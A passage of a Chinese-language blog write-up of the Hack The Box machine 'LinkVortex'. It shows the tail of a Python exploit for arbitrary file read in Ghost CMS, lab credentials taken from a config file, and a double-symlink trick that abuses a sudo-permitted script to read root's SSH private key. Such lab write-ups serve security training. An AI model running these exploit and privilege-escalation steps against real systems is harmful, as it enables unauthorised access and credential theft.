class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;requesting <span class="hljs-subst">&#123;file_url&#125;</span>&quot;</span>)<br>        response = os.popen(<span class="hljs-string">f&quot;curl -b cookie.txt -s <span class="hljs-subst">&#123;file_url&#125;</span>&quot;</span>).read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Not Found&quot;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;file <span class="hljs-subst">&#123;file_url&#125;</span> not found&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received!&quot;</span>)<br>            <span class="hljs-built_in">print</span>(response)<br><br>        clean(payload_path, image_name)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py --url http://linkvortex.htb/ -u admin@linkvortex.htb -p OctopiFociPilfer45<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/db9cabf1ef5d1047.png"></p>
+<p>能够成功读取 <code>/etc/passwd</code> 下的文件，但是其中并没有什么有用的用户</p>
+<p>当访问 dump 下来仓库中的 <code>Dockerfile.ghost</code> 文件时发现</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/4661678031b00741.png"></p>
+<p>当前目录下的 <code>config.production.json</code> 文件复制到镜像内部的 <code>/var/lib/ghost/</code> 目录下</p>
+<p>来读取一下 <code>/var/lib/ghost/config.production.json</code> 文件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;url&quot;:</span> <span class="hljs-string">&quot;http://localhost:2368&quot;</span>,<br>  <span class="hljs-attr">&quot;server&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;port&quot;:</span> <span class="hljs-number">2368</span>,<br>    <span class="hljs-attr">&quot;host&quot;:</span> <span class="hljs-string">&quot;::&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;mail&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;transport&quot;:</span> <span class="hljs-string">&quot;Direct&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;logging&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;transports&quot;:</span> [<span class="hljs-string">&quot;stdout&quot;</span>]<br>  &#125;,<br>  <span class="hljs-attr">&quot;process&quot;:</span> <span class="hljs-string">&quot;systemd&quot;</span>,<br>  <span class="hljs-attr">&quot;paths&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;contentPath&quot;:</span> <span class="hljs-string">&quot;/var/lib/ghost/content&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;spam&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;user_login&quot;:</span> &#123;<br>        <span class="hljs-attr">&quot;minWait&quot;:</span> <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;maxWait&quot;:</span> <span class="hljs-number">604800000</span>,<br>        <span class="hljs-attr">&quot;freeRetries&quot;:</span> <span class="hljs-number">5000</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;mail&quot;:</span> &#123;<br>     <span class="hljs-attr">&quot;transport&quot;:</span> <span class="hljs-string">&quot;SMTP&quot;</span>,<br>     <span class="hljs-attr">&quot;options&quot;:</span> &#123;<br>      <span class="hljs-attr">&quot;service&quot;:</span> <span class="hljs-string">&quot;Google&quot;</span>,<br>      <span class="hljs-attr">&quot;host&quot;:</span> <span class="hljs-string">&quot;linkvortex.htb&quot;</span>,<br>      <span class="hljs-attr">&quot;port&quot;:</span> <span class="hljs-number">587</span>,<br>      <span class="hljs-attr">&quot;auth&quot;:</span> &#123;<br>        <span class="hljs-attr">&quot;user&quot;:</span> <span class="hljs-string">&quot;bob@linkvortex.htb&quot;</span>,<br>        <span class="hljs-attr">&quot;pass&quot;:</span> <span class="hljs-string">&quot;fibber-talented-worth&quot;</span><br>        &#125;<br>      &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到用户名和密码</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">bob<span class="hljs-keyword">@linkvortex</span>.<span class="hljs-attribute">htb</span>:fibber-talented-worth<br></code></pre></td></tr></table></figure>
+
+<p>ssh 连接拿到 userflag</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="sudo-l-查看可-sudo-执行的文件"><a href="#sudo-l-查看可-sudo-执行的文件" class="headerlink" title="sudo -l 查看可 sudo 执行的文件"></a>sudo -l 查看可 sudo 执行的文件</h2><p>用 <code>sudo -l</code> 发现可以执行 <code>/opt/ghost/</code> 目录下的 <code>clean_symlink.sh</code> 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@linkvortex:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on linkvortex:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT<br><br>User bob may run the following commands on linkvortex:<br>    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png<br></code></pre></td></tr></table></figure>
+
+<p>那么切入点应该就在这个文件上面，查看文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>QUAR_DIR=<span class="hljs-string">&quot;/var/quarantined&quot;</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$CHECK_CONTENT</span> ];<span class="hljs-keyword">then</span><br>  CHECK_CONTENT=<span class="hljs-literal">false</span><br><span class="hljs-keyword">fi</span><br><br>LINK=<span class="hljs-variable">$1</span><br><br><span class="hljs-keyword">if</span> ! [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="hljs-keyword">then</span><br>  /usr/bin/echo <span class="hljs-string">&quot;! First argument must be a png file !&quot;</span><br>  <span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="hljs-variable">$LINK</span>;<span class="hljs-keyword">then</span><br>  LINK_NAME=$(/usr/bin/basename <span class="hljs-variable">$LINK</span>)<br>  LINK_TARGET=$(/usr/bin/readlink <span class="hljs-variable">$LINK</span>)<br>  <span class="hljs-keyword">if</span> /usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="hljs-string">&#x27;(etc|root)&#x27;</span>;<span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;! Trying to read critical files, removing link [ <span class="hljs-variable">$LINK</span> ] !&quot;</span><br>    /usr/bin/unlink <span class="hljs-variable">$LINK</span><br>  <span class="hljs-keyword">else</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Link found [ <span class="hljs-variable">$LINK</span> ] , moving it to quarantine&quot;</span><br>    /usr/bin/mv <span class="hljs-variable">$LINK</span> <span class="hljs-variable">$QUAR_DIR</span>/<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable">$CHECK_CONTENT</span>;<span class="hljs-keyword">then</span><br>      /usr/bin/echo <span class="hljs-string">&quot;Content:&quot;</span><br>      /usr/bin/cat <span class="hljs-variable">$QUAR_DIR</span>/<span class="hljs-variable">$LINK_NAME</span> 2&gt;/dev/null<br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>
+
+<p>检测传入的 <code>.png</code> 文件是否为符号链接，如果符号链接指向 <code>/etc</code> 或者 <code>/root</code> 目录就直接删除，不是的话就移动到 <code>/var/quarantined</code> 目录，当 <code>$CHECK_CONTENT= True</code>  时会执行 <code>cat</code> 命令显示读取的文件内容</p>
+<h2 id="双层符号链接绕过检测"><a href="#双层符号链接绕过检测" class="headerlink" title="双层符号链接绕过检测"></a>双层符号链接绕过检测</h2><p>如果直接链接 <code>/root</code> 下的文件肯定会被检测到，绕过方法就是双层符号链接，将 <code>/root</code> 下的文件链接到其他文件夹下的文件，然后再链接为 <code>.png</code> 文件得以读取，因此我们在现在的目录下创建一个文件去链接 <code>/root/.ssh/id_rsa</code> 文件，然后用 ssh 私钥去登录 root 账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /root/.ssh/id_rsa rsa.txt<br><span class="hljs-built_in">ln</span> -s /home/bob/rsa.txt rsa.png<br><span class="hljs-built_in">sudo</span> CHECK_CONTENT=<span class="hljs-literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/rsa.png<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/bf1aca72a04a5f6c.png"></p>
+<p>将得到的私钥保存为 <code>id_rsa</code> 给 600 的权限登录</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/d3c38f7b2c47fe7e.png"></p>
+<p>成功进入 root 账户</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HTB-%E6%B8%97%E9%80%8F/" class="print-no-link">#HTB 渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB-LinkVortex</div>
+      <div>http://example.com/2025/04/14/HTB-LinkVortex/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>butt3rf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/14/HTB-NeuroSync-D/" title="HTB-NeuroSync-D">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB-NeuroSync-D</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/13/HTB-Pikaptcha/" title="HTB-Pikaptcha">
+                        <span class="hidden-mobile">HTB-Pikaptcha</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rWKtzRd76Kz6dC7Vd9dUwQux-gzGzoHsz","appKey":"DxMgc7gveh6B1aJKyAZnoFNj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span> </a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+
+
+  <!--下面两行是核心内容-->
+  <link  rel="stylesheet" href="/css/TrymenT-ClocK.min.css" />
+  <script  src="/js/TrymenT-ClocK.min.js" ></script>
+ 
